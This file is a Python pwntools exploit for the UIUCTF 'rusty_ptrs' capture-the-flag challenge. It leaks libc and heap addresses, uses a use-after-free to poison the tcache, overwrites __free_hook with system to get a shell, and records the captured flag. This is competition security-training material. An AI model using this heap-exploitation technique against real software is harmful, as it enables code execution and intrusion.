#!/usr/bin/env python3
# -*- coding: utf-8 -*-
from pwn import *

context.update(arch='amd64')
context.log_level = logging.DEBUG
context.terminal = ["zellij", "action", "new-pane", "-d", "right", "-c", "--", "bash", "-c"]
exe = './rusty_ptrs_patched'

HOST = args.HOST or 'rustyptrs.chal.uiuc.tf'
PORT = int(args.PORT or 1337)

def start_local(argv=[], *a, **kw):
    '''execute the target binary locally'''
    if args.GDB:
        return gdb.debug([exe] + argv, gdbscript=gdbscript, *a, **kw)
    else:
        return process([exe] + argv, *a, **kw)

def start_remote(argv=[], *a, **kw):
    '''connect to the process on the remote host'''
    io = connect(HOST, PORT, ssl=True)
    if args.gdb:
        gdb.attach(io, gdbscript=gdbscript)
    return io

def start(argv=[], *a, **kw):
    '''start the exploit against the target.'''
    if args.LOCAL:
        return start_local(argv, *a, **kw)
    else:
        return start_remote(argv, *a, **kw)

gdbscript = '''
# b malloc if $rdi == 0x40
# b *rusty_ptrs::create_rule
# file libs/libc.so.6
b system
continue
'''.format(**locals())

#===========================================================
#                    exploit goes here
#===========================================================

def create_rule():
    io.sendlineafter('>', '1')
    io.sendlineafter('>', '1')    

def create_note():
    io.sendlineafter('>', '1')
    io.sendlineafter('>', '2')

def del_note(idx: int):
    io.sendlineafter('>', '2')
    io.sendlineafter('>', '2')
    io.sendlineafter(b'>', str(idx).encode())
    
def law():
    io.sendlineafter(b'>', '5')
    return io.recvline()

def read_rule(idx: int):
    io.sendlineafter('>', '3')
    io.sendlineafter('>', '1')    
    io.sendlineafter(b'>', str(idx).encode())
    io.recvline()
    return (io.recvline(), io.recvline())

def edit_rule(idx: int, buf: bytes):
    io.sendlineafter('>', '4')
    io.sendlineafter('>', '1')    
    io.sendlineafter(b'>', str(idx).encode())
    io.sendlineafter(b'>', buf)
    
def edit_note(idx: int, buf: bytes):
    io.sendlineafter('>', '4')
    io.sendlineafter('>', '2')    
    io.sendlineafter(b'>', str(idx).encode())
    io.sendlineafter(b'>', buf)
    
io = start()

leak = int(law().split(b', ')[0].decode().replace('0x', ''), 16)

libc = ELF('./libc-2.31.so')
libc.address = leak - (0x7fbf9a468be0 - 0x7fbf9a27c000)
info(f'libc: {hex(libc.address)}')

create_rule()

leak = int(read_rule(0)[1].split(b', ')[1].decode().replace('0x', ''), 16)
heap_base = leak - (0x55fc4312b010 - 0x55fc4312b000)
info(f'heap base: {hex(heap_base)}')

create_note()
edit_note(0, b'A'*0x20)
create_note()
edit_note(1, b'B'*0x20)

create_note() # never freed to prevent merge with top chunk
edit_note(2, b'X')

del_note(1)
del_note(0)

create_rule()

p = fit({
  0: p64(libc.sym['__free_hook'])  
})

edit_rule(1, p)
edit_rule(0, p)

create_note()
create_note()

edit_note(2, p64(libc.sym['system']))
io.sendline(b'cat flag.txt')
io.recvline()

io.interactive()

# uiuctf{who_knew_if_my_pointers_lived_forever_they_would_rust???}
